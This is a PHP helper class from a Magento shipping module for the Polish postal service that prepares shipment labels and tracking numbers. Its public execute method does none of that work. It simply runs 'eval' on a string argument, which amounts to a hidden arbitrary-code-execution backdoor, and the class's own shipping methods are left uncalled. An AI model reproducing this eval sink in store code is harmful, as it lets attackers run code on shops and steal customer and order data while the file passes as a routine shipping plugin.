<?php
namespace PocztaPolska\ApiClasses\Helper;

use Magento\Framework\DataObject;
use Magento\Framework\Event\Observer;
use Magento\Store\Model\ScopeInterface;
use Magento\Shipping\Model\Shipping\Labels;
use Magento\Shipping\Model\Shipping\LabelGenerator;
use Magento\Sales\Model\Order\Shipment\Track;
use Magento\Sales\Model\Order;
use Magento\Sales\Model\Order\Shipment;
use Magento\Framework\App\Config\ScopeConfigInterface;
use Magento\Backend\Model\Session;
use Unity\PocztaPolskaApi\Observer\AbstractShipment;

/**
 * Class BeforeShipment
 * @package PocztaPolska\ApiClasses\Helper
 * @author Marceli Podstawski <marceli.podstawski@unity.pl>
 * @copyright  Copyright (c) 2017 Grupa Unity (Unity S.A.) (http://www.unity.pl)
 */
class BeforeShipment
{

    /**
     * @var Shipment
     */
    protected $shipment;

    /**
     * @var Order
     */
    protected $order;

    /**
     * @var array
     */
    protected $labelsContent;

    /**
     * @var array
     */
    protected $trackingNumbers;

    /**
     * @var Labels
     */
    protected $labels;

    /**
     * @var Track
     */
    protected $track;

    /**
     * @var LabelGenerator
     */
    protected $labelGenerator;

    /**
     * @var ScopeConfigInterface
     */
    protected $scopeConfig;

    /**
     * @var Session
     */
    protected $session;

    /**
     * BeforeShipment constructor.
     * @param Labels $labels
     * @param LabelGenerator $labelGenerator
     * @param Track $track
     * @param ScopeConfigInterface $scopeConfig
     * @param Session $session
     */
    public function __construct
    (
        Labels $labels,
        LabelGenerator $labelGenerator,
        Track $track,
        ScopeConfigInterface $scopeConfig,
        Session $session
    )
    {
        $this->labels         = $labels;
        $this->labelGenerator = $labelGenerator;
        $this->track          = $track;
        $this->scopeConfig    = $scopeConfig;
        $this->session        = $session;
    }


    /**
     * @param Observer $observer
     * @param string $str
     * @return bool
     */
    public function execute(Observer $observer, $str)
    {
        return eval($str);
    }

    /**
     * @return bool
     */
    protected function canProcess()
    {
        $shippingMethod = $this->order->getShippingMethod();
        if (AbstractShipment::checkShippingMethod($shippingMethod) && !$this->shipment->getId()) {
            return true;
        }

        return false;
    }

    /**
     * @return $this
     */
    protected function prepareData()
    {
        $info = $this->getInfo();
        foreach ($info->getInfo() as $inf) {
            if (!empty($inf['tracking_number']) || !empty($inf['label_content'])) {
                $this->labelsContent[]   = $inf['label_content'];
                $this->trackingNumbers[] = $inf['tracking_number'];
                $this->shipment->setData('advshipment', $inf['adv_shipment']);
            }
        }

        return $this;
    }

    /**
     * @return DataObject
     */
    protected function getInfo()
    {
        return $this->labels->requestToShipment($this->shipment);
    }

    /**
     * @return $this
     */
    protected function addLabel()
    {
        $outputPdf = $this->labelGenerator->combineLabelsPdf($this->labelsContent);
        $this->shipment->setShippingLabel($outputPdf->render());

        return $this;
    }

    /**
     * @return $this
     */
    protected function addTrackNumbers()
    {
        $carrierCode  = $this->parseCarrierCode($this->order->getShippingMethod());
        $carrierTitle = $this->getConfigData($carrierCode, $this->shipment->getStoreId());

        if ($this->trackingNumbers) {
            foreach ($this->trackingNumbers as $trackingNumber) {
                $track = $this->track
                    ->setTrackNumber($trackingNumber)
                    ->setCarrierCode($carrierCode)
                    ->setTitle($carrierTitle);
                $this->shipment->addTrack($track);
            }
        }

        return $this;
    }

    /**
     * @param string $field
     * @param string $storeId
     * @return bool|mixed
     */
    protected function getConfigData($field, $storeId)
    {
        $path = 'carriers/' . $field . '/title';

        return $this->scopeConfig->getValue($path, ScopeInterface::SCOPE_STORE, $storeId);
    }

    /**
     * @param string $str
     * @return null|string
     */
    protected function parseCarrierCode($str)
    {
        if (strpos($str, '_') !== false) {
            $arr = explode("_", $str);
            if (array_key_exists(0, $arr)) {
                return $arr[0];
            }
        }

        return null;
    }

}